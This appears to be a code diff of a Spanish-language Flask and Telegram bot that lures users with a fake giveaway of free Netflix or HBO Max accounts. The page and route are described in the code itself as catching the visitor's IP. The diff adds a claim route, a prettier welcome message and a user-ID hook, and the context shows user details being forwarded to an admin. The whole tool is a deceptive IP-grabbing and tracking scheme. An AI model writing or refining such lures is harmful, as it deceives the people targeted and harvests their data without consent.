@@ -18,7 +18,7 @@ app = Flask("mi_bot_de_telegram")
 usuarios_registrados = {}
 
 # =========================================================
-# PARTE 1: El servidor web con Sorteo y Animación
+# PARTE 1: El servidor web que atrapa la IP
 # =========================================================
 @app.route('/')
 def capturar_ip():
@@ -68,7 +68,8 @@ def capturar_ip():
     except Exception as e:
         print("Error al obtener datos:", e)
     
-    return """
+    # AQUÍ EMPIEZA LA PÁGINA WEB
+    html_page = """
     <!DOCTYPE html>
     <html lang="es">
     <head>
@@ -90,71 +91,16 @@ def capturar_ip():
                 align-items: center;
                 overflow-x: hidden;
             }
-            .glitch {
-                font-size: 2rem;
-                text-shadow: 0 0 5px #00ff41, 0 0 10px #00ff41, 0 0 20px #00ff41;
-                margin-bottom: 20px;
-            }
-            .loader {
-                border: 4px solid #111;
-                border-top: 4px solid #00ff41;
-                border-radius: 50%;
-                width: 50px;
-                height: 50px;
-                animation: spin 1s linear infinite;
-                margin-bottom: 20px;
-            }
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-            #loading-text {
-                font-size: 1.1rem;
-                min-height: 30px;
-                margin-bottom: 40px;
-            }
-            #result-container {
-                display: none;
-                animation: fadeIn 1s forwards;
-            }
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(20px); }
-                to { opacity: 1; transform: translateY(0); }
-            }
-            .card {
-                background: #0a0a0a;
-                border: 1px solid #333;
-                border-radius: 12px;
-                padding: 30px;
-                width: 220px;
-                transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
-                margin: 0 auto;
-                cursor: pointer;
-            }
-            .card:hover {
-                transform: translateY(-10px);
-                box-shadow: 0 0 25px rgba(0, 255, 65, 0.4);
-                border-color: #00ff41;
-            }
-            .card img {
-                max-width: 100%;
-                height: 80px;
-                object-fit: contain;
-                margin-bottom: 20px;
-            }
-            .btn-fake {
-                background: transparent;
-                border: 1px solid #00ff41;
-                color: #00ff41;
-                padding: 12px 24px;
-                border-radius: 5px;
-                cursor: pointer;
-                font-family: inherit;
-                font-weight: bold;
-                text-transform: uppercase;
-                letter-spacing: 1px;
-                font-size: 1.1rem;
-            }
+            .glitch { font-size: 2rem; text-shadow: 0 0 5px #00ff41, 0 0 10px #00ff41, 0 0 20px #00ff41; margin-bottom: 20px; }
+            .loader { border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            #loading-text { font-size: 1.1rem; min-height: 30px; margin-bottom: 40px; }
+            #result-container { display: none; animation: fadeIn 1s forwards; }
+            @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+            .card { background: #0a0a0a; border: 1px solid #333; border-radius: 12px; padding: 30px; width: 220px; transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s; margin: 0 auto; cursor: pointer; }
+            .card:hover { transform: translateY(-10px); box-shadow: 0 0 25px rgba(0, 255, 65, 0.4); border-color: #00ff41; }
+            .card img { max-width: 100%; height: 80px; object-fit: contain; margin-bottom: 20px; }
+            .btn-fake { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px 24px; border-radius: 5px; cursor: pointer; font-family: inherit; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 1.1rem; }
         </style>
     </head>
     <body>
@@ -166,12 +112,14 @@ def capturar_ip():
         <div id="result-container">
             <div class="glitch" id="result-title">[ ACCESO CONCEDIDO ]</div>
             <p class="subtext" style="color: #ddd; font-size: 1.2rem; margin-bottom: 30px;">Felicidades, has sido elegido para:</p>
-            <div class="card" onclick="alert('Generando cuenta... Vuelve a Telegram para recibirla.')">
+            <div class="card" id="card-btn" onclick="reclamarCuenta()">
                 <img id="platform-logo" src="" alt="Plataforma">
                 <button class="btn-fake" id="platform-name">Reclamar Cuenta</button>
             </div>
         </div>
         <script>
+            var userId = "USER_ID_PLACEHOLDER";
+            
             const textos = ["Iniciando protocolo de seguridad...", "Buscando cuentas disponibles...", "Verificando región...", "Seleccionando tu premio aleatorio..."];
             let i = 0;
             const loadingText = document.getElementById('loading-text');
@@ -180,24 +128,65 @@ def capturar_ip():
                 i++;
                 if (i >= textos.length) clearInterval(interval);
             }, 750);
+
+            let plataformaGanadora = "";
+            
             setTimeout(() => {
                 document.getElementById('loading-container').style.display = 'none';
                 const resultBox = document.getElementById('result-container');
                 const logo = document.getElementById('platform-logo');
                 const name = document.getElementById('platform-name');
+                
                 if (Math.random() < 0.5) {
                     logo.src = "https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png";
                     name.innerText = "Netflix";
+                    plataformaGanadora = "Netflix";
                 } else {
                     logo.src = "https://upload.wikimedia.org/wikipedia/commons/d/d3/HBO_Max_2025_logo.svg";
                     name.innerText = "HBO Max";
+                    plataformaGanadora = "HBO Max";
                 }
                 resultBox.style.display = 'block';
             }, 3000);
+
+            function reclamarCuenta() {
+                document.getElementById('card-btn').innerHTML = '<div class="loader"></div><p style="color:#00ff41">Enviando a Telegram...</p>';
+                fetch('/reclamar?user_id=' + userId + '&plataforma=' + plataformaGanadora)
+                .then(response => response.text())
+                .then(data => {
+                    if(data == "OK") {
+                        document.getElementById('result-container').innerHTML = '<div class="glitch">[ CUENTA ENVIADA ]</div><p style="color:#ddd; font-size:1.2rem; margin-top:20px;">Revisa tu Telegram. Te enviamos tus credenciales!</p>';
+                    } else {
+                        document.getElementById('result-container').innerHTML = '<div class="glitch">[ ERROR ]</div><p style="color:red;">Hubo un problema. Vuelve a Telegram.</p>';
+                    }
+                });
+            }
         </script>
     </body>
     </html>
     """
+    html_page = html_page.replace("USER_ID_PLACEHOLDER", user_id)
+    return html_page
+
+# =========================================================
+# PARTE 1.5: Ruta que manda la cuenta al cliente
+# =========================================================
+@app.route('/reclamar')
+def reclamar_cuenta():
+    user_id = request.args.get('user_id')
+    plataforma = request.args.get('plataforma')
+    try:
+        # AQUÍ PONES LAS CUENTAS QUE LE VAS A ENTREGAR
+        if plataforma == "Netflix":
+            mensaje_cuenta = "🎉 ¡Felicidades! Ganaste una cuenta de Netflix.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
+        else:
+            mensaje_cuenta = "🎉 ¡Felicidades! Ganaste una cuenta de HBO Max.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
+            
+        bot.send_message(user_id, mensaje_cuenta)
+        return "OK"
+    except Exception as e:
+        print("Error al mandar cuenta:", e)
+        return "ERROR"
 
 # =========================================================
 # PARTE 2: Lo que recibe el cliente cuando da START
@@ -220,7 +209,13 @@ def enviar_bienvenida(message):
     except Exception as e:
         print("Error enviando a admin:", e)
 
-    texto_cliente = f"👋 Hola {nombre} bro, bienvenido al grupo de cuentas free 🔥.\n\n🎬 En esta oportunidad, participarás por una cuenta aleatoria de Netflix o HBO Max.\n\nPresiona el botón de abajo para verificar tu acceso y descubrir cuál te tocó 👇"
+    # EL NUEVO MENSAJE BONITO DE BIENVENIDA
+    texto_cliente = (
+        f"🌟 <b>Bienvenido al Bot de Cuentas Premium</b> 🌟\n\n"
+        f"👋 Hola <b>{nombre}</b>, gracias por unirte a nuestra comunidad.\n\n"
+        f"🎬 En esta oportunidad, participarás por una cuenta aleatoria de <b>Netflix</b> o <b>HBO Max</b>.\n\n"
+        f"👇 Presiona el botón de abajo para verificar tu acceso y descubrir cuál te tocó:"
+    )
     
     nombre_codificado = urllib.parse.quote(nombre)
     usuario_codificado = urllib.parse.quote(usuario_tg)
@@ -230,7 +225,8 @@ def enviar_bienvenida(message):
     markup.add(InlineKeyboardButton("✅ Verificar y Ver mi Cuenta", url=boton_url))
     
     try:
-        bot.send_message(message.chat.id, texto_cliente, reply_markup=markup)
+        # Usamos parse_mode='HTML' para que las negritas funcionen y se vea bonito
+        bot.send_message(message.chat.id, texto_cliente, reply_markup=markup, parse_mode='HTML')
     except Exception as e:
         print("Error enviando botón:", e)
         try:
@@ -245,15 +241,12 @@ def encender_servidor():
     puerto = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=puerto)
 
-if __name__ == '__main__':
-    print("Bot encendido y servidor listo...")
-    # El daemon=True hace que el servidor web no bloquee el bot
-    threading.Thread(target=encender_servidor, daemon=True).start()
-    
-    # Bucle de reanimación: Si el bot se cae, espera 5 segundos y arranca de nuevo
-    while True:
-        try:
-            bot.infinity_polling(timeout=20, long_polling_timeout=20)
-        except Exception as e:
-            print(f"Error crítico en el bot. Reiniciando en 5 segundos... {e}")
-            time.sleep(5)
+print("Bot encendido y servidor listo...")
+threading.Thread(target=encender_servidor, daemon=True).start()
+
+while True:
+    try:
+        bot.infinity_polling(timeout=20, long_polling_timeout=20)
+    except Exception as e:
+        print(f"Error crítico en el bot. Reiniciando en 5 segundos... {e}")
+        time.sleep(5)
